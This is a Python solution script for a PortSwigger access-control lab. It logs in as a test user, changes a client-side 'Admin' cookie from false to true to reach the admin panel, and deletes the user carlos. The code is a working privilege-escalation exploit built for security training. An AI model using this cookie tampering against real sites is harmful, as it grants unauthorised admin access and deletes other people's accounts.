# Lab 03 — User role controlled by request parameter
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
#
# Vulnerability: Admin status is read from a client-controlled cookie (Admin=false)
# Aim:           Access the admin panel and delete carlos by flipping the cookie
#
# Technique:
#   After login, the app sets Cookie: Admin=false. The server trusts this
#   cookie value to decide whether to show admin functionality. Since cookies
#   are fully client-controlled, simply changing it to Admin=true grants access.
#
# Usage: python access_control_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — USER ROLE CONTROLLED BY REQUEST PARAMETER (Admin COOKIE)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in as wiener ──────────────────────────────────────────────
    print("  ── Step 1: log in as wiener\n")
    if not login(session, url):
        sys.exit(1)

    admin_cookie = session.cookies.get("Admin")
    print(f"  ℹ  Admin cookie after login: {admin_cookie}\n")

    # ── Step 2: confirm /admin is blocked with Admin=false ───────────────────
    print("  ── Step 2: confirm /admin is blocked with the default cookie value\n")
    r_blocked = session.get(f"{url}/admin")
    check_status(r_blocked, [401, 403, 302], "Access with Admin=false")

    # ── Step 3: flip the cookie to Admin=true ─────────────────────────────────
    print("\n  ── Step 3: flip Admin cookie to true and retry\n")
    session.cookies.set("Admin", "true")
    r_admin = session.get(f"{url}/admin")
    check_status(r_admin, 200, "Access with Admin=true")

    if "carlos" not in r_admin.text:
        print("  ?  'carlos' not visible — inspect the admin panel manually")
        sys.exit(0)

    # ── Step 4: delete carlos ─────────────────────────────────────────────────
    print("\n  ── Step 4: delete carlos\n")
    r_delete = session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  The server trusted a cookie value the client can set to anything.")
    print("     In Burp, this is the kind of check Match and Replace rules automate.")
